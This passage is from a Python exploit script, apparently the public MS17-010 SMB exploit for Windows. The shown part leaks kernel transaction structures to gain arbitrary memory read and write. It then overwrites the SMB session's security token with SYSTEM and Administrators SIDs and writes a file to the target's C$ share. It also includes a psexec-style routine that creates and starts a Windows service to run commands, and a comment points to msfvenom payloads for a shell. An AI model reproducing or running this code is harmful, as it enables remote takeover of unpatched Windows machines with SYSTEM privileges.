	wait_for_request_processed(conn)

	# ================================
	# leak transaction
	# ================================
	print('leak next transaction')
	# modify TRANSACTION member to leak info
	# function=5 (NT_TRANS_RENAME)
	conn.send_trans_secondary(mid=info['fid'], data='\x05', dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_FUNCTION_OFFSET'])
	# parameterCount, totalParameterCount, maxParameterCount, dataCount, totalDataCount
	conn.send_trans_secondary(mid=info['fid'], data=pack('<IIIII', 4, 4, 4, 0x100, 0x100), dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_PARAMCNT_OFFSET'])

	conn.send_nt_trans_secondary(mid=special_mid)
	leakData = conn.recv_transaction_data(special_mid, 0x100)
	leakData = leakData[4:]  # remove param
	#open('leak.dat', 'wb').write(leakData)

	# check heap chunk size value in leak data
	if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
		print('chunk size is wrong')
		return False

	# extract leak transaction data and make next transaction to be trans2
	leakTranOffset = HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
	leakTrans = leakData[leakTranOffset:]
	fmt = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+fmt*5, leakTrans, 8)
	inparam_value, outparam_value, indata_value = unpack_from('<'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])
	trans2_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
	
	print('CONNECTION: 0x{:x}'.format(connection_addr))
	print('SESSION: 0x{:x}'.format(session_addr))
	print('FLINK: 0x{:x}'.format(flink_value))
	print('InData: 0x{:x}'.format(indata_value))
	print('MID: 0x{:x}'.format(trans2_mid))
	
	trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
	trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
	print('TRANS1: 0x{:x}'.format(trans1_addr))
	print('TRANS2: 0x{:x}'.format(trans2_addr))
	
	# ================================
	# modify trans struct to be used for arbitrary read/write
	# ================================
	print('modify transaction struct for arbitrary read/write')
	# modify
	# - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
	# - trans1.InData to &trans2. so we can modify trans2 with trans1 data
	# Note: HIDWORD of trans1.InParameter is still 0xffffffff
	TRANS_OFFSET = 0x100000000 - (info['TRANS_SIZE'] + TRANS_NAME_LEN)
	conn.send_nt_trans_secondary(mid=info['fid'], param=pack('<'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr), paramDisplacement=TRANS_OFFSET+info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)
	
	# modify trans1.mid
	trans1_mid = conn.next_mid()
	conn.send_trans_secondary(mid=info['fid'], param=pack('<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
	
	info.update({
		'connection': connection_addr,
		'session': session_addr,
		'trans1_mid': trans1_mid,
		'trans1_addr': trans1_addr,
		'trans2_mid': trans2_mid,
		'trans2_addr': trans2_addr,
	})
	return True

def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):
	SID_SYSTEM = pack('<BB5xB'+'I', 1, 1, 5, 18)
	SID_ADMINISTRATORS = pack('<BB5xB'+'II', 1, 2, 5, 32, 544)
	SID_AUTHENICATED_USERS = pack('<BB5xB'+'I', 1, 1, 5, 11)
	SID_EVERYONE = pack('<BB5xB'+'I', 1, 1, 1, 0)
	# SID_SYSTEM and SID_ADMINISTRATORS must be added
	sids = [ SID_SYSTEM, SID_ADMINISTRATORS, SID_EVERYONE, SID_AUTHENICATED_USERS ]
	# - user has no attribute (0)
	# - 0xe: SE_GROUP_OWNER | SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT
	# - 0x7: SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY
	attrs = [ 0, 0xe, 7, 7 ]
	
	# assume its space is enough for SID_SYSTEM and SID_ADMINISTRATORS (no check)
	# fake user and groups will be in same buffer of original one
	# so fake sids size must NOT be bigger than the original sids
	fakeUserAndGroupCount = min(userAndGroupCount, 4)
	fakeUserAndGroupsAddr = userAndGroupsAddr
	
	addr = fakeUserAndGroupsAddr + (fakeUserAndGroupCount * info['PTR_SIZE'] * 2)
	fakeUserAndGroups = ''
	for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):
		fakeUserAndGroups += pack('<'+info['PTR_FMT']*2, addr, attr)
		addr += len(sid)
	fakeUserAndGroups += ''.join(sids[:fakeUserAndGroupCount])
	
	return fakeUserAndGroupCount, fakeUserAndGroups


def exploit(target, pipe_name):
	conn = MYSMB(target)
	
	# set NODELAY to make exploit much faster
	conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

	info = {}

	conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
	server_os = conn.get_server_os()
	print('Target OS: '+server_os)
	if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
		info['os'] = 'WIN7'
		info['method'] = exploit_matched_pairs
	elif server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ") or server_os.startswith("Windows Server 2016 ") or server_os.startswith("Windows 10"):
		info['os'] = 'WIN8'
		info['method'] = exploit_matched_pairs
	elif server_os.startswith("Windows Server (R) 2008") or server_os.startswith('Windows Vista'):
		info['os'] = 'WIN7'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows Server 2003 "):
		info['os'] = 'WIN2K3'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows 5.1"):
		info['os'] = 'WINXP'
		info['arch'] = 'x86'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows XP "):
		info['os'] = 'WINXP'
		info['arch'] = 'x64'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows 5.0"):
		info['os'] = 'WIN2K'
		info['arch'] = 'x86'
		info['method'] = exploit_fish_barrel
	else:
		print('This exploit does not support this target')
		sys.exit()
	
	if pipe_name is None:
		pipe_name = find_named_pipe(conn)
		if pipe_name is None:
			print('Not found accessible named pipe')
			return False
		print('Using named pipe: '+pipe_name)

	if not info['method'](conn, pipe_name, info):
		return False

	# Now, read_data() and write_data() can be used for arbitrary read and write.
	# ================================
	# Modify this SMB session to be SYSTEM
	# ================================	
	fmt = info['PTR_FMT']
	
	print('make this SMB session to be SYSTEM')
	# IsNullSession = 0, IsAdmin = 1
	write_data(conn, info, info['session']+info['SESSION_ISNULL_OFFSET'], '\x00\x01')

	# read session struct to get SecurityContext address
	sessionData = read_data(conn, info, info['session'], 0x100)
	secCtxAddr = unpack_from('<'+fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]

	if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
		# Windows 2003 and earlier uses only ImpersonateSecurityContext() (with PCtxtHandle struct) for impersonation
		# Modifying token seems to be difficult. But writing kernel shellcode for all old Windows versions is
		# much more difficult because data offset in ETHREAD/EPROCESS is different between service pack.
		
		# find the token and modify it
		if 'SECCTX_PCTXTHANDLE_OFFSET' in info:
			pctxtDataInfo = read_data(conn, info, secCtxAddr+info['SECCTX_PCTXTHANDLE_OFFSET'], 8)
			pctxtDataAddr = unpack_from('<'+fmt, pctxtDataInfo)[0]
		else:
			pctxtDataAddr = secCtxAddr

		tokenAddrInfo = read_data(conn, info, pctxtDataAddr+info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
		tokenAddr = unpack_from('<'+fmt, tokenAddrInfo)[0]
		print('current TOKEN addr: 0x{:x}'.format(tokenAddr))
		
		# copy Token data for restoration
		tokenData = read_data(conn, info, tokenAddr, 0x40*info['PTR_SIZE'])
		
		userAndGroupCount = unpack_from('<I', tokenData, info['TOKEN_USER_GROUP_CNT_OFFSET'])[0]
		userAndGroupsAddr = unpack_from('<'+fmt, tokenData, info['TOKEN_USER_GROUP_ADDR_OFFSET'])[0]
		print('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))
		print('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))

		print('overwriting token UserAndGroups')
		# modify UserAndGroups info
		fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr)
		if fakeUserAndGroupCount != userAndGroupCount:
			write_data(conn, info, tokenAddr+info['TOKEN_USER_GROUP_CNT_OFFSET'], pack('<I', fakeUserAndGroupCount))
		write_data(conn, info, userAndGroupsAddr, fakeUserAndGroups)
	else:
		# the target can use PsImperonateClient for impersonation (Windows 2008 and later)
		# copy SecurityContext for restoration
		secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])

		print('overwriting session security context')
		# see FAKE_SECCTX detail at top of the file
		write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])

	# ================================
	# do whatever we want as SYSTEM over this SMB connection
	# ================================	
	try:
		smb_pwn(conn, info['arch'])
	except:
		pass

	# restore SecurityContext/Token
	if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
		userAndGroupsOffset = userAndGroupsAddr - tokenAddr
		write_data(conn, info, userAndGroupsAddr, tokenData[userAndGroupsOffset:userAndGroupsOffset+len(fakeUserAndGroups)])
		if fakeUserAndGroupCount != userAndGroupCount:
			write_data(conn, info, tokenAddr+info['TOKEN_USER_GROUP_CNT_OFFSET'], pack('<I', userAndGroupCount))
	else:
		write_data(conn, info, secCtxAddr, secCtxData)

	conn.disconnect_tree(conn.get_tid())
	conn.logoff()
	conn.get_socket().close()
	return True


def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."

def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
	with open(localSrc, 'rb') as fp:
		smbConn.putFile(remoteDrive + '$', remotePath, fp.read)

# based on impacket/examples/serviceinstall.py
# Note: using Windows Service to execute command same as how psexec works
def service_exec(conn, cmd):
	import random
	import string
	from impacket.dcerpc.v5 import transport, srvs, scmr
	
	service_name = ''.join([random.choice(string.letters) for i in range(4)])

	# Setup up a DCE SMBTransport with the connection already in place
	rpcsvc = conn.get_dce_rpc('svcctl')
	rpcsvc.connect()
	rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
	svcHandle = None
	try:
		print("Opening SVCManager on %s....." % conn.get_remote_host())
		resp = scmr.hROpenSCManagerW(rpcsvc)
		svcHandle = resp['lpScHandle']
		
		# First we try to open the service in case it exists. If it does, we remove it.
		try:
			resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+'\x00')
		except Exception as e:
			if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') == -1:
				raise e  # Unexpected error
		else:
			# It exists, remove it
			scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
			scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
		
		print('Creating service %s.....' % service_name)
		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
		serviceHandle = resp['lpServiceHandle']
		
		if serviceHandle:
			# Start service
			try:
				print('Starting service %s.....' % service_name)
				scmr.hRStartServiceW(rpcsvc, serviceHandle)
				# is it really need to stop?
				# using command line always makes starting service fail because SetServiceStatus() does not get called
				#print('Stoping service %s.....' % service_name)
				#scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
			except Exception as e:
				print(str(e))
			
			print('Removing service %s.....' % service_name)
			scmr.hRDeleteService(rpcsvc, serviceHandle)
			scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
	except Exception as e:
		print("ServiceExec Error on: %s" % conn.get_remote_host())
		print(str(e))
	finally:
		if svcHandle:
			scmr.hRCloseServiceHandle(rpcsvc, svcHandle)

	rpcsvc.disconnect()


if len(sys.argv) < 2:
	print("{} <ip> [pipe_name]".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = None if len(sys.argv) < 3 else sys.argv[2]

exploit(target, pipe_name)
print('Done')